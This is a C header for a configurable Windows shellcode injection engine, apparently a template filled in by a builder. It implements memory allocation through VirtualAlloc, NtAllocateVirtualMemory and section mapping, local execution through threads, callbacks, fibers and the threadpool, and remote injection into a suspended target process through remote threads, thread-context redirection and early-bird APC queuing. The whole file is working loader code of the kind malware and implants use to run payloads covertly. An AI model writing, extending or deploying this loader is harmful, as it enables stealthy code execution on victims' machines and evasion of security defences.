#ifndef STARBURST_ENGINE_H
#define STARBURST_ENGINE_H

#include <windows.h>
#include <winternl.h>

/*
 * Modular injection engine.
 * Builder stamps one ALLOC_* define and one EXEC_* define.
 *
 * Allocation methods:
 *   ALLOC_VIRTUALALLOC        - VirtualAlloc / VirtualAllocEx
 *   ALLOC_NTALLOCATE          - NtAllocateVirtualMemory (syscall-level)
 *   ALLOC_MAPVIEW             - NtCreateSection + NtMapViewOfSection
 *
 * Execution methods (local):
 *   EXEC_DIRECT               - Cast to function pointer, call
 *   EXEC_CREATETHREAD         - CreateThread
 *   EXEC_CALLBACK             - EnumWindows callback
 *   EXEC_FIBER                - ConvertThreadToFiber + CreateFiber
 *   EXEC_THREADPOOL           - TpAllocWork + TpPostWork
 *
 * Injection modes (remote - requires INJECT_REMOTE + target process):
 *   INJECT_REMOTE             - Write into remote process, execute via remote thread
 *   INJECT_HOLLOW             - Process hollowing (suspended process, unmap, write, resume)
 *   INJECT_EARLYBIRD          - Create suspended process, QueueUserAPC, resume
 */

/* ─── ntdll typedefs for direct syscall paths ─── */

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtFreeVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG);
typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE, PVOID);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtResumeThread)(
    HANDLE, PULONG);
typedef NTSTATUS (NTAPI *pNtQueueApcThread)(
    HANDLE, PVOID, PVOID, PVOID, PVOID);

typedef NTSTATUS (NTAPI *pTpAllocWork)(
    void**, void*, void*, void*);
typedef void (NTAPI *pTpPostWork)(void*);
typedef void (NTAPI *pTpReleaseWork)(void*);

/* ─── resolve ntdll function ─── */

static FARPROC engine_resolve(const char *name) {
    return GetProcAddress(GetModuleHandleA("ntdll.dll"), name);
}

/* ═══════════════════════════════════════════════════════
 *  ALLOCATION
 * ═══════════════════════════════════════════════════════ */

static void* engine_alloc(HANDLE hProcess, SIZE_T size) {
#if defined(ALLOC_NTALLOCATE)
    pNtAllocateVirtualMemory NtAlloc =
        (pNtAllocateVirtualMemory)engine_resolve("NtAllocateVirtualMemory");
    void *addr = NULL;
    SIZE_T region = size;
    NTSTATUS st = NtAlloc(hProcess, &addr, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    return (st == 0) ? addr : NULL;

#elif defined(ALLOC_MAPVIEW)
    pNtCreateSection NtCreate =
        (pNtCreateSection)engine_resolve("NtCreateSection");
    pNtMapViewOfSection NtMap =
        (pNtMapViewOfSection)engine_resolve("NtMapViewOfSection");

    HANDLE hSection = NULL;
    LARGE_INTEGER secSize;
    secSize.QuadPart = (LONGLONG)size;

    NTSTATUS st = NtCreate(&hSection, SECTION_ALL_ACCESS, NULL, &secSize,
                           PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (st != 0) return NULL;

    void *addr = NULL;
    SIZE_T viewSize = 0;
    st = NtMap(hSection, hProcess, &addr, 0, 0, NULL, &viewSize, 1 /* ViewShare */, 0, PAGE_EXECUTE_READWRITE);
    CloseHandle(hSection);
    return (st == 0) ? addr : NULL;

#else /* ALLOC_VIRTUALALLOC (default) */
    return VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#endif
}

static int engine_protect(HANDLE hProcess, void *addr, SIZE_T size) {
#if defined(ALLOC_NTALLOCATE)
    pNtProtectVirtualMemory NtProtect =
        (pNtProtectVirtualMemory)engine_resolve("NtProtectVirtualMemory");
    ULONG old = 0;
    void *base = addr;
    SIZE_T region = size;
    return NtProtect(hProcess, &base, &region, PAGE_EXECUTE_READ, &old) == 0;

#elif defined(ALLOC_MAPVIEW)
    /* mapped sections created with PAGE_EXECUTE_READWRITE can be re-protected */
    pNtProtectVirtualMemory NtProtect =
        (pNtProtectVirtualMemory)engine_resolve("NtProtectVirtualMemory");
    ULONG old = 0;
    void *base = addr;
    SIZE_T region = size;
    return NtProtect(hProcess, &base, &region, PAGE_EXECUTE_READ, &old) == 0;

#else
    DWORD old;
    return VirtualProtectEx(hProcess, addr, size, PAGE_EXECUTE_READ, &old);
#endif
}

static void engine_write(HANDLE hProcess, void *dst, const void *src, SIZE_T size) {
    if (hProcess == GetCurrentProcess()) {
        memcpy(dst, src, size);
    } else {
        pNtWriteVirtualMemory NtWrite =
            (pNtWriteVirtualMemory)engine_resolve("NtWriteVirtualMemory");
        if (NtWrite) {
            NtWrite(hProcess, dst, (PVOID)src, size, NULL);
        } else {
            WriteProcessMemory(hProcess, dst, src, size, NULL);
        }
    }
}

/* ═══════════════════════════════════════════════════════
 *  LOCAL EXECUTION
 * ═══════════════════════════════════════════════════════ */

#if defined(EXEC_FIBER)
struct FiberCtx { void *sc_addr; void *main_fiber; };
static void CALLBACK engine_fiber_wrapper(LPVOID param) {
    struct FiberCtx *ctx = (struct FiberCtx*)param;
    ((void(*)())ctx->sc_addr)();
    SwitchToFiber(ctx->main_fiber);
}
#endif

static HANDLE engine_exec_local(void *addr) {
#if defined(EXEC_CREATETHREAD)
    return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);

#elif defined(EXEC_CALLBACK)
    EnumWindows((WNDENUMPROC)addr, 0);
    return NULL;

#elif defined(EXEC_FIBER)
    void *mainFiber = ConvertThreadToFiber(NULL);
    if (!mainFiber) return NULL;
    struct FiberCtx ctx = { addr, mainFiber };
    void *scFiber = CreateFiber(0, engine_fiber_wrapper, &ctx);
    if (!scFiber) return NULL;
    SwitchToFiber(scFiber);
    DeleteFiber(scFiber);
    return NULL;

#elif defined(EXEC_THREADPOOL)
    pTpAllocWork TpAlloc = (pTpAllocWork)engine_resolve("TpAllocWork");
    pTpPostWork  TpPost  = (pTpPostWork)engine_resolve("TpPostWork");
    pTpReleaseWork TpRel = (pTpReleaseWork)engine_resolve("TpReleaseWork");

    if (!TpAlloc || !TpPost || !TpRel) return NULL;

    void *work = NULL;
    NTSTATUS st = TpAlloc(&work, (void*)addr, NULL, NULL);
    if (st != 0 || !work) return NULL;
    TpPost(work);
    TpRel(work);
    /* sleep briefly to let threadpool execute */
    Sleep(1000);
    return NULL;

#else /* EXEC_DIRECT (default) */
    ((void(*)())addr)();
    return NULL;
#endif
}

/* ═══════════════════════════════════════════════════════
 *  REMOTE INJECTION
 * ═══════════════════════════════════════════════════════ */

#if defined(INJECT_REMOTE)
static int engine_inject_remote(const unsigned char *sc, unsigned int sc_len, const char *target) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 0;
    }

    void *addr = engine_alloc(pi.hProcess, sc_len);
    if (!addr) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 0;
    }

    engine_write(pi.hProcess, addr, sc, sc_len);
    engine_protect(pi.hProcess, addr, sc_len);

    ResumeThread(pi.hThread);

    HANDLE hRemote = CreateRemoteThread(pi.hProcess, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    if (hRemote) {
        WaitForSingleObject(hRemote, INFINITE);
        CloseHandle(hRemote);
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
}
#endif

#if defined(INJECT_HOLLOW)
static int engine_inject_hollow(const unsigned char *sc, unsigned int sc_len, const char *target) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 0;
    }

    /* get thread context to find entry point */
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    /* allocate in remote process at any address */
    void *addr = engine_alloc(pi.hProcess, sc_len);
    if (!addr) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 0;
    }

    engine_write(pi.hProcess, addr, sc, sc_len);
    engine_protect(pi.hProcess, addr, sc_len);

    /* redirect RIP/EIP to shellcode */
#ifdef _WIN64
    ctx.Rip = (DWORD64)addr;
#else
    ctx.Eip = (DWORD)addr;
#endif
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
}
#endif

#if defined(INJECT_EARLYBIRD)
static int engine_inject_earlybird(const unsigned char *sc, unsigned int sc_len, const char *target) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 0;
    }

    void *addr = engine_alloc(pi.hProcess, sc_len);
    if (!addr) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 0;
    }

    engine_write(pi.hProcess, addr, sc, sc_len);
    engine_protect(pi.hProcess, addr, sc_len);

    /* queue APC to main thread - executes before entry point */
    pNtQueueApcThread NtQueueApc =
        (pNtQueueApcThread)engine_resolve("NtQueueApcThread");
    if (NtQueueApc) {
        NtQueueApc(pi.hThread, addr, NULL, NULL, NULL);
    } else {
        QueueUserAPC((PAPCFUNC)addr, pi.hThread, 0);
    }

    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
}
#endif

/* ═══════════════════════════════════════════════════════
 *  UNIFIED ENTRY POINT
 * ═══════════════════════════════════════════════════════ */

static int engine_run(const unsigned char *sc, unsigned int sc_len) {
#if defined(INJECT_REMOTE)
    return engine_inject_remote(sc, sc_len, %INJECT_TARGET%);
#elif defined(INJECT_HOLLOW)
    return engine_inject_hollow(sc, sc_len, %INJECT_TARGET%);
#elif defined(INJECT_EARLYBIRD)
    return engine_inject_earlybird(sc, sc_len, %INJECT_TARGET%);
#else
    /* local execution */
    HANDLE hSelf = GetCurrentProcess();
    void *addr = engine_alloc(hSelf, sc_len);
    if (!addr) return 0;

    engine_write(hSelf, addr, sc, sc_len);
    engine_protect(hSelf, addr, sc_len);

    HANDLE hThread = engine_exec_local(addr);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    return 1;
#endif
}

#endif /* STARBURST_ENGINE_H */
